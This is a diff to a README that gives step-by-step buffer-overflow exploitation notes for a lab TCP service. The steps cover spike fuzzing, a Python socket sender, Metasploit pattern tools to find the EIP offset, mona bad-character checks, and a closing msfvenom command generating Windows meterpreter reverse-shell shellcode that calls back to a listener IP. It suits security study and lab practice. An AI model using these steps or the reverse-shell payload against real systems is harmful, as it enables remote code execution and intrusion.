@@ -7,14 +7,20 @@ s_string("OVERFLOW1 ");
 s_string_variable("0");
 ```
 generic_send_tcp 10.10.10.10. 1337 stats.spk 0 0
+
 ![alt text](https://github.com/ydy4/BOF_simple_steps/blob/main/github/1.png?raw=true)
+
 ### Identifie total_length
 ![alt text](https://github.com/ydy4/BOF_simple_steps/blob/main/github/2.png?raw=true)
+
 ![alt text](https://github.com/ydy4/BOF_simple_steps/blob/main/github/3.png?raw=true)
+
 ### Identifie EIP
-msf-pattern_create –l 2984_
+msf-pattern_create –l 2984
+
 ![alt text](https://github.com/ydy4/BOF_simple_steps/blob/main/github/4.png?raw=true)
 ```bash
+
 #! /usr/bin/python
 import socket
 s = socket.socket()
@@ -26,21 +32,30 @@ s.send(payload)
 s.close()
 ```
 EIP = 43396E43
+
 ![5.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/5.png?raw=true)
+
 ### Identifie Offset
-msf-pattern_offset –l 2984 –q 43396E43
+msf-pattern_offset –l 2984 –q 43396E43.
+
 ![5.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/6.png?raw=true)
+
 Offset = 1977
  ### Identifie ESP
  ![7.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/7.png?raw=true)
 ESP = 62501203
 ### Identifie Bad Characters
-!mona bytearray -b "\x00"_
+!mona bytearray -b "\x00"
+
 ![8.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/8.png?raw=true)
+
 ![9.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/9.png?raw=true)
-now we compare with the dump of  ESP = 019FF130
+
+now we compare with the dump of  ESP = 019FF130.
+
 ![10.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/10.png?raw=true)
-!mona compare -f C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin -a 019FFA30
+!mona compare -f C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin -a 019FFA30.
+
 ![11.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/11.png?raw=true)
 ### Create ShellCode
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.160.125 LPORT=6666 -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload
